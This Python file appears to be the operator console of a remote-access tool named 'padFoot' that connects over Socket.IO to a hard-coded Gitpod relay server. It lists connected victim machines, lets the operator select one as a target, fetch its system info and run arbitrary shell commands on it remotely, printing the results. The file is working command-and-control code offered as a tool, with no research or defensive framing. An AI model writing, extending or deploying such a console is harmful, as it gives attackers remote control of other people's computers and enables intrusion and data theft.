import socketio
import threading
import time
import json
import os
import public_ip as ip
import platform

SERVER = 'https://3000-p0syd0n-padfootserver-bziowkwf04k.ws-us102.gitpod.io'
# Connect to the Socket.IO server
sio = socketio.Client()
connected = False
waiting = False
selected_target = ""
cached_clients = {}

def clear():
    # Check the operating system
    system = platform.system()
    
    if system == "Windows":
        os.system("cls")  # For Windows
    elif system == "Linux":
        os.system("clear")  # For Linux

def connecting_dots_effect():
    global connected

    while not connected:
        print("Connecting", end="")
        for _ in range(3):
            time.sleep(0.5)
            print(".", end="", flush=True)
            time.sleep(0.5)
        clear()

    # Connection is established, display message without clearing the screen
    print("\nConnection established!")

    # Launch the shell function in a new thread
    shell_thread = threading.Thread(target=shell)
    shell_thread.start()

def shell():
    global waiting, selected_target
    clear()
    print("Welcome to padFoot!")
    while True:
        if selected_target != "":
            input_prompt = f"pF: {selected_target} >"
        else:
            input_prompt = "pF >"
        command = str(input(input_prompt))
        command_list = command.split(" ")
        command = command_list[0]
        if selected_target != "":
            match command:
                case 'info':
                    waiting = True
                    data = {'target': selected_target}
                    sio.emit('getInfo', data)
                    while waiting:
                        pass
                case 'shell':
                    while True:
                        shellInput = str(input(f"pF/{selected_target} $"))
                        if shellInput == "EXIT":
                            break
                        waiting = True
                        sio.emit('sendCommand', {'command': shellInput, 'target': selected_target})
                        while waiting:
                            pass
        match command:
            case 'list':
                waiting = True
                sio.emit('getConnectedClients', {'isShell': True})
                while waiting:
                    pass
            case 'set':
                if command_list[1] in cached_clients:
                    selected_target = command_list[1]

@sio.on('establishmentResponse')
def establishmentResponse(data):
    global connected
    if data == 200:
        connected = True
        sio.emit('getConnectedClients', {'isShell': False})
    else:
        connected = False

@sio.on('getInfoResponse')
def getInfoResponse(data):
    global waiting
    print(json.dumps(data, indent=4))
    waiting = False

@sio.on('sendCommandResponse')
def sendCommandResponse(data):
    global waiting
    print(data['output'])
    waiting = False

@sio.on('getConnectedClientsResponse')
def shellGetConnectedClientsResponse(data):
    global waiting, cached_clients
    cached_clients = data["connectedClients"]
    if data["isShell"]:
        print(json.dumps(cached_clients, indent=4))
        waiting = False

@sio.on('connect')
def on_connect():
    data = {'client': False} 
    sio.emit('establishment', data)
    

# Start the connection
sio.connect(SERVER)

start_time = time.time()
dots_thread = threading.Thread(target=connecting_dots_effect)
dots_thread.start()

# Wait for the connection to establish
sio.wait()
